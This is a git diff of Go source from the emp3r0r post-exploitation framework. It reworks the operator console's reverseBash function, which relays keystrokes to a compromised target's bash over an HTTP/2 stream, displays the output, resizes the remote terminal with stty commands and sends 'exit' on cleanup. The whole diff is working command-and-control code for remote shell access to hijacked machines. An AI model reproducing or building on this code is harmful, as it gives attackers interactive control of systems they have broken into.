@@ -2,8 +2,8 @@ package cc
 
 import (
 	"bufio"
+	"context"
 	"fmt"
-	"log"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -15,19 +15,60 @@ import (
 	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
 )
 
-func reverseBash() {
+func reverseBash(ctx context.Context, send chan []byte, recv chan []byte) {
+	var err error
+
 	// check if stty is installed
 	if !IsCommandExist("stty") {
 		CliPrintError("stty is not found, wtf?")
 		return
 	}
 
-	// activate reverse shell in agent
-	err := SendCmd("bash", CurrentTarget)
-	if err != nil {
-		CliPrintError("Cannot activate reverse shell on remote target: ", err)
-		return
-	}
+	cancel := agent.H2Stream.Cancel
+
+	// receive and display bash's output
+	// FIXME the output may gets scrambled upon 2nd run
+	go func(ctx context.Context) {
+		for incoming := range recv {
+			select {
+			case <-ctx.Done():
+				color.Red("Receiver done as context canceled")
+				return
+			default:
+				_, err = os.Stdout.Write(incoming)
+				if err != nil {
+					CliPrintWarning("Stdout write: %v", err)
+					return
+				}
+			}
+		}
+	}(ctx)
+
+	// send whatever input to target's bash
+	go func(ctx context.Context) {
+		defer func() {
+			// always send 'exit' to correctly log out our bash shell
+			send <- []byte("exit\n\n")
+		}()
+
+		for outgoing := range send {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+
+				// if connection does not exist yet
+				if agent.H2Stream.Conn == nil {
+					continue
+				}
+				_, err = agent.H2Stream.Conn.Write(outgoing)
+				if err != nil {
+					CliPrintWarning("Send to remote: %v", err)
+					return
+				}
+			}
+		}
+	}(ctx)
 
 	// use /dev/tty for our console
 	ttyf, err := os.Open("/dev/tty")
@@ -44,6 +85,15 @@ func reverseBash() {
 
 	// clean up connection and TTY file
 	cleanup := func() {
+		CliPrintWarning("Cleaning up reverseBash")
+
+		// cancel context, cleanup all goroutines
+		cancel()
+		if ctx.Err() != nil {
+			CliPrintWarning("reverseBash context: %v", ctx.Err())
+		}
+
+		// restore terminal settings
 		out, err := exec.Command("stty", "-F", "/dev/tty", oldTerm).CombinedOutput()
 		if err != nil {
 			CliPrintError("failed to restore terminal: %v\n%s", err, out)
@@ -57,43 +107,9 @@ func reverseBash() {
 		if err != nil {
 			CliPrintWarning("Closing reverse shell connection: ", err)
 		}
-		CliPrintWarning("Cleaned up reverseBash")
+		CliPrintSuccess("Cleaned up reverseBash")
 	}
 	defer cleanup()
-
-	// receive and display bash's output
-	go func() {
-		for incoming := range RecvAgent {
-			if agent.H2Stream.IsClosed {
-				break
-			}
-			_, err = os.Stdout.Write(incoming)
-			if err != nil {
-				CliPrintWarning("Stdout write: %v", err)
-			}
-		}
-		CliPrintWarning("Read remote finished")
-	}()
-
-	// send whatever input to target's bash
-	go func() {
-		for outgoing := range SendAgent {
-			if agent.H2Stream.IsClosed {
-				break
-			}
-
-			// if connection does not exist yet
-			if agent.H2Stream.Conn == nil {
-				continue
-			}
-			_, err = agent.H2Stream.Conn.Write(outgoing)
-			if err != nil {
-				CliPrintWarning("Send to remote: %v", err)
-				break
-			}
-		}
-		CliPrintWarning("Send to remote finished")
-	}()
 
 	/*
 		set up terminal
@@ -101,28 +117,31 @@ func reverseBash() {
 	// Handle pty size.
 	ch := make(chan os.Signal, 1)
 	signal.Notify(ch, syscall.SIGWINCH)
-	go func() {
+	go func(ctx context.Context) {
 		for range ch {
-			if agent.H2Stream.IsClosed {
-				break
-			}
-
-			// resize local terminal
-			if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
-				log.Printf("error resizing pty: %s", err)
-			}
-			// sync remote terminal with stty
-			winSize, err := pty.GetsizeFull(os.Stdin)
-			if err != nil {
-				CliPrintWarning("Cannot get terminal size: %v", err)
+			select {
+			case <-ctx.Done():
 				return
+			default:
+				// resize local terminal
+				if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
+					CliPrintError("error resizing pty: %s", err)
+					return
+				}
+				// sync remote terminal with stty
+				winSize, err := pty.GetsizeFull(os.Stdin)
+				if err != nil {
+					CliPrintWarning("Cannot get terminal size: %v", err)
+					return
+				}
+				setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
+					winSize.Rows, winSize.Cols)
+				send <- []byte(setupTermCmd)
 			}
-			setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
-				winSize.Rows, winSize.Cols)
-			SendAgent <- []byte(setupTermCmd)
 		}
 		CliPrintWarning("Terminal resizer finished")
-	}()
+		cancel()
+	}(ctx)
 	ch <- syscall.SIGWINCH // Initial resize.
 
 	// resize remote terminal to match local
@@ -132,7 +151,7 @@ func reverseBash() {
 	}
 	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
 		currentWinSize.Rows, currentWinSize.Cols)
-	SendAgent <- []byte(setupTermCmd)
+	send <- []byte(setupTermCmd)
 
 	// switch to raw mode
 	out, err = exec.Command("stty", "-F", "/dev/tty", "raw", "-echo").CombinedOutput()
@@ -142,29 +161,27 @@ func reverseBash() {
 	}
 
 	// read user input from /dev/tty
-	for {
+	for ctx.Err() == nil {
 		// if connection is lost, press any key to exit
-		if agent.H2Stream.IsClosed {
+		select {
+		case <-ctx.Done():
 			CliPrintWarning("Remote bash disconnected, aborting...")
 			return
-		}
+		default:
+			buf := make([]byte, agent.BufSize)
+			consoleReader := bufio.NewReader(ttyf)
+			_, err := consoleReader.Read(buf)
+			if err != nil {
+				CliPrintWarning("Bash read input: %v", err)
+				return
+			}
+			if buf[0] == 4 { // Ctrl-D is 4
+				color.Red("EOF")
+				return
+			}
 
-		buf := make([]byte, agent.BufSize)
-		consoleReader := bufio.NewReader(ttyf)
-		_, err := consoleReader.Read(buf)
-		if err != nil {
-			CliPrintWarning("Bash read input: %v", err)
-			break
+			// send our byte
+			send <- buf
 		}
-		if buf[0] == 4 { // Ctrl-D is 4
-			color.Red("EOF")
-			break
-		}
-
-		// send our byte
-		SendAgent <- buf
 	}
-
-	// always send 'exit' to correctly log out our bash shell
-	SendAgent <- []byte("exit\n\n")
 }
